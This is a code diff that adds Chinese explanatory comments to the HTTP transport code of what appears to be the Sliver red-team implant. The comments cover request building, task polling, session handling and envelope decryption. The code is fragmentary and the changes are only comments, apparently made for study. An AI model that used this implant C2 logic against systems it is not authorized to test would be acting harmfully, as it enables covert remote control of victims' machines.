@@ -232,6 +232,7 @@ func (s *SliverHTTPClient) OTPQueryArgument(uri *url.URL, value string) *url.URL
 	return uri
 }
 
+// 构造HTTP请求包，增加自定义Host、Header、Params
 func (s *SliverHTTPClient) newHTTPRequest(method string, uri *url.URL, body io.Reader) *http.Request {
 	req, _ := http.NewRequest(method, uri.String(), body)
 	if s.Options.HostHeader != "" {
@@ -290,6 +291,7 @@ func (s *SliverHTTPClient) newHTTPRequest(method string, uri *url.URL, body io.R
 }
 
 // Do - Wraps http.Client.Do with a context
+// 发送请求并获取响应结果
 func (s *SliverHTTPClient) DoPoll(req *http.Request) (*http.Response, []byte, error) {
 	// NOTE: We must atomically manage the context
 	s.pollMutex.Lock()
@@ -410,10 +412,12 @@ func (s *SliverHTTPClient) establishSessionID(sessionInit []byte) error {
 }
 
 // ReadEnvelope - Perform an HTTP GET request
+// 发送Get方法，并将读取到的内容解码、解密、反序列化为pb.Envelope返回
 func (s *SliverHTTPClient) ReadEnvelope() (*pb.Envelope, error) {
 	if s.Closed {
 		return nil, ErrClosed
 	}
+	// 第一次请求时，获取到的SessionID
 	if s.SessionID == "" {
 		return nil, errors.New("no session")
 	}
@@ -437,9 +441,11 @@ func (s *SliverHTTPClient) ReadEnvelope() (*pb.Envelope, error) {
 		// {{end}}
 		return nil, errors.New("invalid session")
 	}
+	// 当前没有任务
 	if resp.StatusCode == http.StatusNoContent {
 		return nil, nil
 	}
+	// 接到结果后，解码、解密、反序列化到envelope结构体中
 	if resp.StatusCode == http.StatusOK {
 		var body []byte
 		if 0 < len(rawRespData) {
@@ -578,6 +584,7 @@ func (s *SliverHTTPClient) pathJoinURL(segments []string) string {
 	return strings.Join(segments, "/")
 }
 
+// 获取随机的轮询URI
 func (s *SliverHTTPClient) pollURL() *url.URL {
 	curl, _ := url.Parse(s.Origin)
 
